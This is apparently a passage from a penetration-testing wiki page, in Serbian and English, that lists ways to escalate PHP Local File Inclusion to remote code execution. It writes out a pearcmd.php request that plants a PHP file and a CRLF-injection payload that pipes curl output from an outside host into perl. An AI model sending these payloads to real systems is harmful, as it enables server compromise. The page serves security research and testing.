Ako ste otkrili **Local File Inclusion** čak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako pošaljete **`PHP_SESSION_UPLOAD_PROGRESS`** u **multipart POST** podacima, PHP će **omogućiti sesiju za vas**. Ovo možete zloupotrebiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Preko temp file uploads u Windows

Ako ste otkrili **Local File Inclusion** i server radi na **Windows**, možda ćete dobiti **RCE**:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Preko `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ispod se zloupotrebljava CRLF vuln da bi se dobio RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Preko phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji otkriva **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Preko compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i možete exfiltrate putanju temp fajla ALI **server** proverava da li **fajl koji će biti uključen ima PHP oznake**, možete pokušati da zaobiđete tu proveru ovom **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Preko eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da PHP izvršenje **hang**, onda možete satima **brute force** imena fajlova da biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Treba da uključite isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Čak i ako izazovete PHP Fatal Error, PHP privremeni fajlovi koji su upload-ovani se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
